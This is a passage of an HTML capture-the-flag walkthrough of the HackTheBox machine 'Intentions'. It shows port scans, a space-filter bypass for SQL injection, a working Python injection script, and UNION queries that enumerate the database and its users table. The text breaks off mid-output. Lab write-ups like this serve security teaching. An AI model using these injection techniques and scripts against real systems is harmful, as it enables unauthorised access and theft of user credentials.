@@ -1,0 +1,1274 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intentions - HTB</title>
+    <link rel="stylesheet" href="/styles.css">
+    <link rel="stylesheet" href="/writeups.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <ul>
+                <li><a href="/index.html">Home</a></li>
+                <li><a href="/writeups.html">Writeups</a></li>
+                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
+                <li><a href="/about.html">About me</a></li>
+            </ul>
+        </nav>
+    </header>
+    <section class="writeup-content">
+        <div class="container">
+            <div class="writeup-panel">
+                <img src="/writeups/htb/hard/intentions/img/intentions.png" alt="Machine Icon" class="machine-icon-circle">
+                <h2>Intentions - HTB</h2>
+                <p>walkthrough by elswix<p>
+                <ul class="machine-links">
+                    <li><a href="https://app.hackthebox.com/machines/Intentions">HackTheBox</a></li>
+                </ul>
+            </div>
+            <div class="writeup-content-main">
+                <div class="codehilite"><pre><span></span><code><span class="n">Machine</span><span class="o">:</span><span class="w"> </span><span class="n">Intentions</span>
+<span class="n">Difficult</span><span class="o">:</span><span class="w"> </span><span class="n">Hard</span>
+<span class="n">Platform</span><span class="o">:</span><span class="w"> </span><span class="n">HackTheBox</span>
+<span class="n">Release</span><span class="o">:</span><span class="w"> </span><span class="n">Released</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="mi">07</span><span class="sr">/01/</span><span class="mi">2023</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+<h3><br/>About Intentions</h3><br/>
+Intentions is a hard-level machine from the HackTheBox platform. Initially, we discovered a SQL injection vulnerability that allowed us to obtain hashes of administrator users. We also came across valuable information about a purported version 2 of the API, which enabled us to use these hashes as credentials.<br/><br/>
+<h3><br>Shell as www-data</br></h3><br>
+In the <code>admin</code> section, we encountered a function that applies effects to images provided by users. This technology utilizes PHP Imagick, through which we were able to execute commands by uploading a PHP web shell, exploiting a vulnerability.<br/><br/>
+<h3><br>Shell as greg</br></h3><br>
+By listing the contents of the directory where the website is hosted, we discovered a <code>.git</code> directory, indicating that the entire website is part of a Git repository. Upon inspecting the existing commits, we found one that leaked credentials, granting us access as the user <code>greg</code>.<br/><br/>
+<h3><br>Shell as root</br></h3><br>
+Finally, as the 'greg' user, we can execute a binary that will enable us to read system files without regard to our privileges, utilizing a clever exploitation and exploiting a capability. We've developed a Python script to automate a brute force process.<br/><br/>
+<h3><br>Recon</br></h3><br>
+As always, we'll kick off with a port scan to uncover open ports. Keep in mind that these ports expose various services on the machine. For this task, we'll employ Nmap:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">--</span><span class="k">open</span><span class="w"> </span><span class="o">-</span><span class="n">sS</span><span class="w"> </span><span class="o">--</span><span class="nf">min</span><span class="o">-</span><span class="n">rate</span><span class="w"> </span><span class="mi">10000</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="o">-</span><span class="n">Pn</span><span class="w"> </span><span class="mf">10.10.11.220</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">portScan</span>
+
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+At first glance, we observe that ports 80 and 22 are accessible. The subsequent step entails conducting a comprehensive scan to identify the technologies and services operating over these ports.<br/><br/>
+Once again, we'll employ Nmap to execute this scan:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sCV</span><span class="w"> </span><span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="w"> </span><span class="mf">10.10.11.220</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">fullScan</span>
+
+<span class="n">PORT</span><span class="w">   </span><span class="k">STATE</span><span class="w"> </span><span class="n">SERVICE</span><span class="w"> </span><span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">ssh</span><span class="w">     </span><span class="n">OpenSSH</span><span class="w"> </span><span class="mf">8.9</span><span class="n">p1</span><span class="w"> </span><span class="n">Ubuntu</span><span class="w"> </span><span class="mi">3</span><span class="n">ubuntu0</span><span class="mf">.1</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="n">protocol</span><span class="w"> </span><span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="nl">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="mi">47</span><span class="err">:</span><span class="nl">d2</span><span class="p">:</span><span class="mi">00</span><span class="err">:</span><span class="mi">66</span><span class="err">:</span><span class="mi">27</span><span class="err">:</span><span class="mi">5</span><span class="nl">e</span><span class="p">:</span><span class="nl">e6</span><span class="p">:</span><span class="mi">9</span><span class="nl">c</span><span class="p">:</span><span class="mi">80</span><span class="err">:</span><span class="mi">89</span><span class="err">:</span><span class="mi">03</span><span class="err">:</span><span class="nl">b5</span><span class="p">:</span><span class="mi">8</span><span class="nl">f</span><span class="p">:</span><span class="mi">9</span><span class="nl">e</span><span class="p">:</span><span class="mi">60</span><span class="err">:</span><span class="n">e5</span><span class="w"> </span><span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="nl">c8</span><span class="p">:</span><span class="nl">d0</span><span class="p">:</span><span class="nl">ac</span><span class="p">:</span><span class="mi">8</span><span class="nl">d</span><span class="p">:</span><span class="mi">29</span><span class="err">:</span><span class="mi">9</span><span class="nl">b</span><span class="p">:</span><span class="mi">87</span><span class="err">:</span><span class="mi">40</span><span class="err">:</span><span class="mi">5</span><span class="nl">f</span><span class="p">:</span><span class="mi">1</span><span class="nl">b</span><span class="p">:</span><span class="nl">b0</span><span class="p">:</span><span class="nl">a4</span><span class="p">:</span><span class="mi">1</span><span class="nl">d</span><span class="p">:</span><span class="mi">53</span><span class="err">:</span><span class="mi">8</span><span class="nl">f</span><span class="p">:</span><span class="n">f1</span><span class="w"> </span><span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span><span class="w"> </span><span class="k">open</span><span class="w">  </span><span class="n">http</span><span class="w">    </span><span class="n">nginx</span><span class="w"> </span><span class="mf">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="nl">title</span><span class="p">:</span><span class="w"> </span><span class="n">Intentions</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="nl">header</span><span class="p">:</span><span class="w"> </span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span><span class="w"> </span><span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="n">Service</span><span class="w"> </span><span class="nl">Info</span><span class="p">:</span><span class="w"> </span><span class="nl">OS</span><span class="p">:</span><span class="w"> </span><span class="n">Linux</span><span class="p">;</span><span class="w"> </span><span class="nl">CPE</span><span class="p">:</span><span class="w"> </span><span class="nl">cpe</span><span class="p">:</span><span class="o">/</span><span class="nl">o</span><span class="p">:</span><span class="nl">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Based on the earlier findings, we can now ascertain that port 80 is associated with the HTTP service (Web Application Service), while port 22 corresponds to the SSH service.<br/><br/>
+<h3><br>Web Application</br></h3><br>
+Before accessing the website through our web browser, we can use <code>whatweb</code> to attempt to uncover the technologies, versions, and other details of the website.<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="p">@</span><span class="n">kali$</span><span class="w"> </span><span class="n">whatweb</span><span class="w"> </span><span class="o">-</span><span class="n">a</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="mf">10.10.11.220</span>
+<span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.11.220 [200 OK] Cookies[XSRF-TOKEN,intentions_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[intentions_session], IP[10.10.11.220], Script, Title[Intentions], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Nothing of interest here.<br/><br/>
+Accessing the website through our browser, we observe the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/1.png"/><br/><br/>
+It seems to be an authentication panel; however, we don't have valid credentials.<br/><br/>
+Some common attacks that we can attempt here include SQL injection. Let's try some typical queries:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/2.png"/><br/><br/>
+If we attempt to enter this information, we'll find that only a valid email address format is accepted.<br/><br/>
+Now, let's proceed to create a new user in the registration section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/3.png"/><br/><br/>
+At this point, we need to log in by providing the credentials we specified during the registration of our new user:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/4.png"/><br/><br/>
+When valid credentials are supplied, the system will redirect us to the following page:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/5.png"/><br/><br/>
+I recommend using the <a href="https://addons.mozilla.org/es/firefox/addon/darkreader/">Dark Reader</a> extension for Firefox (I believe it also works with other browsers). It converts websites into dark mode, which is easier on your eyes.<br/><br/>
+This website seems to function as a gallery where you can explore various genres of photos. Accessing the Gallery section, we find a wide array of themes. There are four distinct genres: Animals, Nature, Architecture, and Food.<br/><br/>
+In the <code>Your Profile</code> section, you can modify certain personal information associated with your user account, such as your nickname, email, and your <code>Favorite Genres</code>:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/6.png"/><br/><br/>
+The values you set for <code>Favorite Genres</code> will determine the genres of images displayed in the <code>Your Feed</code> section.<br/><br/>
+All the requests we make are directed to an API. I observed this in the HTTP History of my Burp Suite:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/7.png"/><br/><br/>
+This is an important aspect to bear in mind.<br/><br/>
+We have established that modifying the <code>Favorite Genres</code> information leads to corresponding changes in the <code>Your Feed</code> section. It's possible that this interaction involves a database operation behind the scenes.<br/><br/>
+At this juncture, I'll proceed to make all requests using Burp Suite. This allows me to receive more detailed responses and exercise greater control over my requests.<br/><br/>
+With the default information in the <code>Favorite Genres</code> section, I observe the following outcome when I initiate a request to the <code>Your Feed</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/9.png"/><br/><br/>
+<h3><br>SQL Injection</br></h3><br>
+What occurs if I add a single quote when altering the <code>Favorite Genres</code> information:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/10.png"/><br/><br/>
+After updating this information, let's proceed to make a GET request to the <code>Your Feed</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/11.png"/><br/><br/>
+It returns an error, indicating that we might be triggering a SQL injection. While experimenting with the most common queries, I observed that spaces in the <code>Favorite Genres</code> information are being stripped:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/12.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/13.png"/><br/><br/>
+Eliminating white spaces can indeed pose a challenge for carrying out a successful SQL injection. However, there are several techniques available to circumvent the removal of white spaces.<br/><br/>
+One such technique is the <code>space2comment</code> method, which involves replacing white spaces with SQL comments. Allow me to illustrate this with an example. Suppose you wish to input the following SQL query: <br/><br/>
+<div class="codehilite"><pre><span></span><code>' or 1=1--
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Instead of the original query, when employing the <code>space2comment</code> technique, the query would appear as follows:<br/><br/>
+<div class="codehilite"><pre><span></span><code>'/**/or/**/1=1--
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Comments in SQL are disregarded during the query interpretation, enabling us to successfully bypass the removal of white spaces:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/18.png"/><br/><br/>
+Now, if I send a GET request to the <code>Your Feed</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/19.png"/><br/><br/>
+It's still not functioning as expected. Let's attempt some modifications to the query:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/20.png"/><br/><br/>
+"I've appended a <code>)</code> after the single quote and a <code>#</code> to comment out the remainder of the query.<br/><br/>
+Now, if I issue a request to the <code>Your Feed</code> section:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/intentions/img/21.png"/><br/><br/>
+It retrieves all the photos from various genres, confirming that we have successfully exploited a SQL injection.<br/><br/>
+I'm going to create a Python script to automate this process<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/python3 </span>
+
+<span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">json</span> 
+
+
+
+<span class="c1"># Global</span>
+<span class="n">loginUrl</span> <span class="o">=</span> <span class="s2">"http://10.10.11.220/api/v1/auth/login"</span>
+<span class="n">injectUrl</span> <span class="o">=</span> <span class="s2">"http://10.10.11.220/api/v1/gallery/user/genres"</span>
+<span class="n">readUrl</span> <span class="o">=</span> <span class="s2">"http://10.10.11.220/api/v1/gallery/user/feed"</span>
+
+
+<span class="k">def</span> <span class="nf">makeReq</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+
+
+    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span> <span class="s2">"/**/"</span><span class="p">)</span>
+
+
+    <span class="n">login_data</span> <span class="o">=</span> <span class="p">{</span>
+
+        <span class="s2">"email"</span><span class="p">:</span><span class="s2">"elswix@elswix.com"</span><span class="p">,</span>
+        <span class="s2">"password"</span><span class="p">:</span><span class="s2">"elswix123"</span>  
+
+    <span class="p">}</span>
+
+
+    <span class="n">injection_data</span> <span class="o">=</span> <span class="p">{</span>
+
+        <span class="s2">"genres"</span><span class="p">:</span><span class="sa">f</span><span class="s2">"')</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">#"</span>
+
+    <span class="p">}</span>
+
+
+    <span class="c1"># Login</span>
+    <span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> 
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">loginUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">login_data</span><span class="p">)</span> 
+
+    <span class="c1"># Injection</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">injectUrl</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">injection_data</span><span class="p">)</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">readUrl</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">[!] 500 INTERNAL SERVER ERROR</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="k">return</span> 
+
+
+    <span class="n">output</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">output</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">output</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+
+    <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+
+
+
+
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"SQLI $&gt; "</span><span class="p">)</span>
+        <span class="n">makeReq</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
+
+
+
+
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">main</span><span class="p">()</span>
+    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Quitting...</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Let's proceed to execute the script:<br/><br/>
+<div class="codehilite"><pre><span></span><code><span class="n">elswix</span><span class="nv">@kali</span><span class="err">$</span><span class="w"> </span><span class="n">python3</span><span class="w"> </span><span class="n">exploit</span><span class="p">.</span><span class="n">py</span>
+<span class="n">SQLI</span><span class="w"> </span><span class="err">$</span><span class="o">&gt;</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span>
+<span class="err">{</span>
+<span class="w">    </span><span class="ss">"status"</span><span class="err">:</span><span class="w"> </span><span class="ss">"success"</span><span class="p">,</span>
+<span class="w">    </span><span class="ss">"data"</span><span class="err">:</span><span class="w"> </span><span class="o">[</span>
+<span class="n">        {</span>
+<span class="n">            "id": 1,</span>
+<span class="n">            "file": "public/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg",</span>
+<span class="n">            "genre": "animals",</span>
+<span class="n">            "created_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "updated_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "url": "/storage/animals/ashlee-w-wv36v9TGNBw-unsplash.jpg"</span>
+<span class="n">        },</span>
+<span class="n">        {</span>
+<span class="n">            "id": 2,</span>
+<span class="n">            "file": "public/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg",</span>
+<span class="n">            "genre": "animals",</span>
+<span class="n">            "created_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "updated_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "url": "/storage/animals/dickens-lin-Nr7QqJIP8Do-unsplash.jpg"</span>
+<span class="n">        },</span>
+<span class="n">        {</span>
+<span class="n">            "id": 3,</span>
+<span class="n">            "file": "public/animals/dickens-lin-tycqN7-MY1s-unsplash.jpg",</span>
+<span class="n">            "genre": "animals",</span>
+<span class="n">            "created_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "updated_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "url": "/storage/animals/dickens-lin-tycqN7-MY1s-unsplash.jpg"</span>
+<span class="n">        },</span>
+<span class="n">        ..........</span>
+<span class="n">        ..........</span>
+<span class="n">        ..........</span>
+<span class="n">        {</span>
+<span class="n">            "id": 18,</span>
+<span class="n">            "file": "public/nature/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg",</span>
+<span class="n">            "genre": "nature",</span>
+<span class="n">            "created_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "updated_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "url": "/storage/nature/marek-piwnicki-VOv4uaMf9E4-unsplash.jpg"</span>
+<span class="n">        },</span>
+<span class="n">        {</span>
+<span class="n">            "id": 19,</span>
+<span class="n">            "file": "public/nature/rafael-garcin-GsQ0iSb88HY-unsplash.jpg",</span>
+<span class="n">            "genre": "nature",</span>
+<span class="n">            "created_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "updated_at": "2023-02-02T17:41:52.000000Z",</span>
+<span class="n">            "url": "/storage/nature/rafael-garcin-GsQ0iSb88HY-unsplash.jpg"</span>
+<span class="n">        }</span>
+<span class="n">    </span><span class="o">]</span>
+<span class="err">}</span>
+<span class="n">SQLI</span><span class="w"> </span><span class="err">$</span><span class="o">&gt;</span><span class="w"> </span>
+</code></pre><br style="line-height: 0.5;"/></div>
+
+After attempting to determine the number of columns, I have ascertained that there are a total of five columns. <br/><br/>
+<div class="codehilite"><pre><span></span><code>SQLI $&gt; UNION ALL SELECT NULL,NULL,NULL,NULL,NULL
+{
+    "status": "success",
+    "data": [
+        {
+            "id": null,
+            "file": null,
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/"
+        }
+    ]
+}
+SQLI $&gt; 
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Now, we'll initiate the process of database enumeration. Initially, we need to identify how many databases are present in the system:<br/><br/>
+<div class="codehilite"><pre><span></span><code>SQLI $&gt; UNION ALL SELECT NULL,schema_name,NULL,NULL,NULL from information_schema.schemata
+{
+    "status": "success",
+    "data": [
+        {
+            "id": null,
+            "file": "information_schema",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/information_schema"
+        },
+        {
+            "id": null,
+            "file": "intentions",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/intentions"
+        }
+    ]
+}
+SQLI $&gt; 
+</code></pre><br style="line-height: 0.5;"/></div>
+
+There are two databases in the system: one is named <code>information_schema</code>, and the other is <code>intentions</code>. We will proceed with the enumeration of the <code>intentions</code> database.<br/><br/>
+Next, we'll list the tables within the <code>intentions</code> database.<br/><br/>
+<div class="codehilite"><pre><span></span><code>SQLI $&gt; UNION ALL SELECT NULL,table_name,NULL,NULL,NULL from information_schema.tables where table_schema="intentions"
+{
+    "status": "success",
+    "data": [
+        {
+            "id": null,
+            "file": "gallery_images",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/gallery_images"
+        },
+        {
+            "id": null,
+            "file": "personal_access_tokens",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/personal_access_tokens"
+        },
+        {
+            "id": null,
+            "file": "migrations",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/migrations"
+        },
+        {
+            "id": null,
+            "file": "users",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/users"
+        }
+    ]
+}
+SQLI $&gt; 
+</code></pre><br style="line-height: 0.5;"/></div>
+
+Among all these tables, the one that piques my interest the most is <code>users</code>. Next, we will proceed to enumerate the columns within the <code>users</code> table:<br/><br/>
+<div class="codehilite"><pre><span></span><code>SQLI $&gt; UNION ALL SELECT NULL,column_name,NULL,NULL,NULL from information_schema.columns where table_schema="intentions" and table_name="users"
+{
+    "status": "success",
+    "data": [
+        {
+            "id": null,
+            "file": "id",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/id"
+        },
+        {
+            "id": null,
+            "file": "name",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/name"
+        },
+        {
+            "id": null,
+            "file": "email",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/email"
+        },
+        {
+            "id": null,
+            "file": "password",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/password"
+        },
+        {
+            "id": null,
+            "file": "created_at",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/created_at"
+        },
+        {
+            "id": null,
+            "file": "updated_at",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/updated_at"
+        },
+        {
+            "id": null,
+            "file": "admin",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/admin"
+        },
+        {
+            "id": null,
+            "file": "genres",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/genres"
+        }
+    ]
+}
+SQLI $&gt; 
+</code></pre><br style="line-height: 0.5;"/></div>
+
+There are numerous columns, and based on their names, it appears that I may be perusing the personal information of users. I'll retain <code>email</code> and <code>password</code> since having access to this information could potentially allow me to log in as another user.<br/><br/>
+I've also noted the presence of a column called <code>Admin</code>, which seems to be associated with a boolean value determining whether users have elevated privileges or not. I will proceed to investigate the values stored in the <code>Admin</code> column.:<br/><br/>
+<div class="codehilite"><pre><span></span><code>SQLI $&gt; UNION ALL SELECT NULL,admin,NULL,NULL,NULL from users
+{
+    "status": "success",
+    "data": [
+        {
+            "id": null,
+            "file": "1",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/1"
+        },
+        {
+            "id": null,
+            "file": "1",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/1"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
+            "updated_at": null,
+            "url": "/storage/0"
+        },
+        {
+            "id": null,
+            "file": "0",
+            "genre": null,
+            "created_at": null,
